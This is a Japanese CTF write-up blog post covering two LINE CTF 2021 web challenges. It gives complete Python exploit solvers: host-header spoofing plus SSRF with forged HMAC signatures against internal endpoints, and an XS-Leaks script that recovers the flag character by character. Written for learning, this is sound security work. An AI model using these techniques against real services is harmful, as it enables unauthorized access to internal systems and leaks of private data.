---
id: writeup-of-line-ctf-2021
title: LINE CTF 2021 Writeup ([Web] diveinternal, Your note)
publishedAt: 2021-03-21T04:14:00.000Z
tags: [CTF, Writeup, Web Security, Nginx, SSRF, Host Spoofing, Python, XS-Leaks]
---

こんにちは、8ayacです🐝
本記事は、[LINE CTF 2021](https://ctftime.org/event/1269)で解いた2問のWriteupです。
解いた問題は、diveinternalとYour Note[^1]です。

感謝と謝罪とWriteupは鮮度が大事らしいので、内容は丁寧な解説とかはなく、簡易的なものになっています。[^2]
基本的には、問題の内容を知っている人向けの説明になっており、コンテキストが大きく省略されている部分がありますので、ご注意ください。

The English version is [here](http://blog.8ay.ac/articles/2021-03-21/writeup-of-line-ctf-2021-english-ver)

## [Web 50pts] diveinternal (65/680 Solves)

### 問題文

```txt
Target the server's internal entries, access admin, and roll back.

Keytime: Asia/Japan

添付ファイル: diveInternal.zip
```

### Writeup

配布された`nginx.conf`を[gixy](https://github.com/yandex/gixy)でスキャンしたところ、設定に欠陥があることがわかった。
具体的には、ホストヘッダフォージェリ[^3]に対して脆弱な設定になっていた。
下記は、gixyによる実際のスキャン結果である。

```shell-session
$ gixy nginx/nginx.conf

==================== Results ===================

>> Problem: [host_spoofing] The proxied Host header may be spoofed.
Description: In most cases "$host" variable are more appropriate, just use it.
Additional info: https://github.com/yandex/gixy/blob/master/docs/en/plugins/hostspoofing.md
Pseudo config:

server {
        server_name nginx;

        location / {
                proxy_set_header Host $http_host;
        }
}

==================== Summary ===================
Total issues:
    Unspecified: 0
    Low: 0
    Medium: 1
    High: 0
```

次に、このNginxの設定に起因する脆弱性を利用して、バックエンド側のアプリに直接アクセスできることがわかった。
具体的に言うと、任意のHTTPリクエスト(GETリクエスト[^4])を発行できた。

リクエストをフォワードする先のURLは、下記のように、ある程度自由に指定できた。

- スキーム: 未確認(今回は`http`が使えれば十分)
- ホスト(ポートを含む): 脆弱なエンドポイントで発生する正規のリクエストで、ヘッダ`Host`の値を書き換えることで任意の値を指定できた。
- パス+クエリ文字列: 脆弱なエンドポイントで発生する正規のリクエストで、`Lang`の値を書き換えることで、任意の値を指定できた。[^5]

あとは、バックエンドのアプリの仕様を整理して、パズルをした。
詳細は、後述のSolverを参照されたい。

<details>
<summary>
    バックエンドのアプリの仕様に関するメモ
</summary>

### class `Activity` in `app.main`

#### Instance variables

|Name|Description||
|-|-|-|
|`engine`|DB操作エンジン|DBMSはSQLite|
|`session`|DBのセッションオブジェクト||
|`dbHash`|DBの整合性検証用ハッシュ|`hashlib.md5(open(os.environ['DBFILE'], 'rb').read()).hexdigest()`|
|`integrityKey`|dbHashの完全性検証用Key|`hashlib.sha512((self.dbHash).encode('ascii')).hexdigest()`|
|`subscriberObjs`|DBに予め存在するSubscriberオブジェクトのリスト||
|`backupedHash`|||

#### Methods

|Method|Description|Notes|
|-|-|-|
|`__init__(self)`|ただのコンストラクタ||
|`DbBackupRunner(self)`|DBのロールバックを実行する|ロールバックには`app.rollback()`を利用する|
|`Commit(self)`|DBへデータを登録する|コミットが失敗した場合に`app.rollback()`が呼び出される|
|`UpdateKey(self)`|`self.integrityKey`/`self.dbHash`を更新する||
|`IntegrityCheckWorker(self)`|`self.dbHash`を使いDBファイルのIntegrityCheckを行うワーカー|`self.run`による定期実行用|
|`IntegrityCheck(self, key, dbHash)`|引数`dbHash`を利用して、DBが意図せず変更されていないことを検証する。|意図しない変更を検知した場合、`FLAG`の内容を読み出しreturnする。(???)|
|`AddSubscriber(self, email`)|DBに新規のSubscriber情報を登録する|Subscriber情報の詳細は`app.datamodel.Subscriber`を参照|
|`ScheduleWorker`|DBのIntegrityCheckを定期実行するワーカー||
|`run`|DBのIntegrityCheckを定期実行する||

### Utilities in `app.main`

|Function|Description|Notes|
|-|-|-|
|`valid_download(src)`|srcが指定されているかを検証する||
|`WriteFile(url)`|引数`url`に対するGETリクエストのレスポンスを、あるファイルに書き込む。|あるファイル: f`backup/${url.split('/')[-1]}`|
|`LanguageNomarize(request)`|リクエストのヘッダ`Lang`の値を正規化する|正規化した後、f`${request.host_url}{language}`にGETリクエストを飛ばす。そのリクエストに対するレスポンスのコードが200だった場合、レスポンスの文字列がreturnされる。|
|`list_routes()`|重要でないため省略||
|`SignCheck(request)`|リクエストのクエリ文字列に対するHMAC検証を行う|`GET /rollback`と`GET or POST /rollback`内で利用されている。|

### Utilities in `app.rollback`

|Function|Description|Notes|
|-|-|-|
|`RunRollbackDB(dbhash)`|DBのロールバックを実行する|`backup/`以下に、引数`dbhash`から記号を取り除いた名前のファイルがあれば、(なぜか)FLAGの内容を読み出して返してくれる。|
|`RunbackupDB(remove, dbhash)`|省略||

### Endpoints

|Endpoint|Description|Notes|
|-|-|-|
|`GET /index`|トップページ||
|`GET /en`|省略||
|`GET /jp`|省略||
|`GET /coin`|コインの価格情報を返すAPI|レスポンスのヘッダー`Lang`には`app.main.LanguageNomarize(request)`の結果がセットされる|
|`GET /download`|パラメータ`src`で指定されたURLをダウンロードする|ダウンロードには`app.main.download(src)`を利用する|
|`POST /download`|`GET /download`と同様||
|`GET /addsub`|新規Subscriber登録用API||
|`GET /integrityStatus`|DBの完全性に関するステータス取得用API|DBファイルのパスと、現在のDBの整合性検証用ハッシュ(`dbHash`)の値が取得できる。|
|`GET /rollback`|DBのロールバック用API|`app.main.SignCheck(request)`をpassすると、`app.main.Activity.IntegrityCheck`が実行される。引数`key`には、リクエストヘッダ`Key`の値が渡され、引数`dbHash`にはクエリ文字列で指定した`dbhash`の値が渡される。|

</details>

### Solver

```py
import hashlib
import hmac
import json
from urllib.parse import urljoin

import requests

PUBLIC_BASE_URL = 'http://35.190.234.195/'
PRIVATE_HOST = 'localhost:5000'

PRIVATE_KEY = b"let'sbitcorinparty"


def get_db_hash() -> str:
    res = requests.get(urljoin(PUBLIC_BASE_URL, '/'),
                       headers={
                           'Host': PRIVATE_HOST,
                           'Lang': 'integrityStatus'
                       })
    return json.loads(res.headers['lang'])['dbhash']


def generate_sign(s: str) -> str:
    return hmac.new(PRIVATE_KEY, s.encode(), hashlib.sha512).hexdigest()


def generate_key(s: str) -> str:
    return hashlib.sha512(s.encode('ascii')).hexdigest()


def add_prefix(s: str, prefix: str) -> str:
    return f'{prefix}{s}'


def execute_download(srcUrl: str) -> requests.Response:
    sign = generate_sign(f'src={srcUrl}')
    return requests.get(urljoin(PUBLIC_BASE_URL, '/'),
                        headers={
                            'Host': PRIVATE_HOST,
                            'Lang': f'download?src={srcUrl}',
                            'Sign': sign
                        })


def execute_rollback(dbHash: str) -> requests.Response:
    FRAGMENT = '_'

    key = generate_key(dbHash)
    sign = generate_sign(f'dbhash={add_prefix(dbHash, FRAGMENT)}')

    return requests.get(urljoin(PUBLIC_BASE_URL, '/'),
                        headers={
                            'Host': PRIVATE_HOST,
                            'Lang': f'rollback?dbhash={add_prefix(dbHash, FRAGMENT)}',
                            'Key': key,
                            'Sign': sign
                        })


def exploit():
    execute_download(f'https://lab.8ay.ac/{get_db_hash()}')
    res = execute_rollback(get_db_hash())

    print(f'flag: {res.headers["lang"]}')


if __name__ == "__main__":
    exploit()
```

### Flag

`LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}`

## [Web 50pts] Your Note (22/680 Solves)

### 問題文

```txt
Secure private note service
※ Admin have disabled some security feature of their browser...

Flag Format: LINECTF{[a-z0-9-]+}

添付ファイル: your-note.zip
```

### Writeup

`GET /search`のソースコードの下記部分に注目した。

```py
@app.route('/search')
@login_required
def search():
    q = request.args.get('q')
    download = request.args.get('download') is not None
    if q:
        notes = Note.query.filter_by(owner=current_user).filter(or_(Note.title.like(f'%{q}%'), Note.content.like(f'%{q}%'))).all()
        if notes and download:
            return Response(json.dumps(NoteSchema(many=True).dump(notes)), headers={'Content-disposition': 'attachment;filename=result.json'})
    else:
        return redirect(url_for('index'))
    return render_template('index.html', notes=notes, is_search=True)
```

8~9行目を見ると、下記の条件がすべて整っているとき、レスポンスヘッダに`Content-disposition: attachment`が入ってくることがわかる。

- 検索機能で得られたNoteの件数が1件以上である
- request.args.get('download')がNoneでない

要するに、検索機能において、クエリ文字列として`?download=`を与えた上で検索機能を実行した結果が、下記のように分かれる。

|検索機能で得られたNoteの件数|レスポンスに`Content-disposition: attachment`が付くか|
|:-:|:-:|
|1件以上|✅|
|1件よりも少ない|✖|

この性質をオラクルとしたXS Leaksが想定解法と予想した。
実際に、管理者に`{{BASE_URL}}/search?q=%&download`[^6]というURLをレポートしたところ、通常とは違う`ng`というメッセージが出たため、この予想は正しかった。

### Solver

下記のSolverを使って、flag文字列を頭から一文字ずつ抽出した。[^7]

```py
import os
import string
import subprocess
from concurrent.futures.thread import ThreadPoolExecutor
from urllib.parse import quote, urljoin

from selenium import webdriver
from selenium.webdriver.chrome.options import Options

BASE_URL = os.getenv('BASE_URL')

USERNAME = os.getenv('USERNAME')
PASSWORD = os.getenv('PASSWORD')

S = string.ascii_lowercase + string.digits + '-'

FLAG_PRE = 'LINECTF{'
FLAG_SUF = '}'


def length_is(n: int) -> str:
    return f'{FLAG_PRE}{"_" * n}{FLAG_SUF}'


def nth_char_is(n: int, c: str) -> str:
    return f'{FLAG_PRE}{"_" * (n - 1)}{c}%{FLAG_SUF}'


def prop_holds(prop: str):
    print(f"\r[info] Attempting this prop => '{prop}'\033[0K", end='')

    options = Options()
    options.add_argument('--headless')
    driver = webdriver.Chrome(os.getenv('CHROME_DRIVER_PATH'), options=options)
    try:
        # Login
        driver.get(urljoin(BASE_URL, '/login'))
        driver.find_element_by_css_selector('input[name=username]').send_keys(USERNAME)
        driver.find_element_by_css_selector('input[name=password]').send_keys(PASSWORD)
        driver.find_element_by_css_selector('button[type=submit]').submit()

        # Move to /report
        report_bug_button = driver.find_element_by_css_selector('a.button.is-warning.is-light')
        report_bug_button.click()

        # Proof of work
        pow_cmd = driver.find_element_by_tag_name('strong').get_attribute('textContent').split('&&')[-1].strip()
        proof = subprocess.check_output(pow_cmd, shell=True).decode()

        # Make the payload
	    payload = urljoin(BASE_URL, f'/search?q={prop}&download=')

        # Submit the payload
        driver.find_element_by_css_selector('input[name=url]').send_keys(payload)
        driver.find_element_by_css_selector('input[name=proof]').send_keys(proof)
        driver.find_element_by_css_selector(
            '#content > div > div > div.box > form > div:nth-child(4) > p > button').submit()

        # Check the result
        flash_message_el = driver.find_element_by_css_selector(
            '#content > div > div > div.box > form > div:nth-child(6)')
        truth = flash_message_el.get_attribute('textContent').strip() == 'ng'

        return prop, truth

    except Exception as e:
        return prop, False

    finally:
        driver.close()


def backup(revealed_flag: str):
    with open('flag.bak', mode='w') as f:
        f.write(revealed_flag)


if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=8) as executor:
        upper_bound = 50
        props = [length_is(i) for i in range(1, upper_bound + 1)]
        secret_length = [v[0].count('_') for i, v in enumerate(list(executor.map(prop_holds, props))) if v[1]].pop()

    print(f'\r[+] secret_length: {secret_length}\033[0K')

    secret = ''
    for i in range(1, secret_length + 1):
        with ThreadPoolExecutor(max_workers=4) as executor:
            props = [nth_char_is(i, c) for c in S]
            possible_chars = [v for v in executor.map(prop_holds, props) if v[1]]
            if len(possible_chars) == 1:
                secret += possible_chars.pop()[0].lstrip(f'{FLAG_PRE}{"_" * (i - 1)}').rstrip(f'%{FLAG_SUF}')
            else:
                secret += '?'

            print(f'\r[+] ~N={i} => {secret}\033[0K')
            backup(f'{FLAG_PRE}{secret}')

    print(f'[*] flag: {FLAG_PRE}{secret}{FLAG_SUF}')
```

### Flag

`LINECTF{1-kn0w-what-y0u-d0wn10ad}`

## 注釈

[^1]: こちらは、チームメイトの[@y0d3n](https://twitter.com/y0d3n)氏と解きました。
[^2]: ひとまず簡単なWriteup出しておいて、復習するタイミングで詳細な解説を付けるやり方は、割とありな気がしている。
[^3]: FYI: <https://qiita.com/no1zy_sec/items/dfccd91cf76bf73b7754>
[^4]: GETリクエストがあればflagを入手するには十分だったため、他のメソッドのリクエストが発行できるかは調査しなかった。
[^5]: フォワードされた後、`app.main.LanguageNomarize(request)`を用いて、正規化される場合がある。
[^6]: `%`は0文字以上の文字列を表すワイルドカード
[^7]: 実際には、チームメイトの[@y0d3n](https://twitter.com/y0d3n)氏による手動リークの方が速かったが、プライバシーの観点から、彼の顔写真の代わりにPythonによるSolverスクリプトを掲載した。
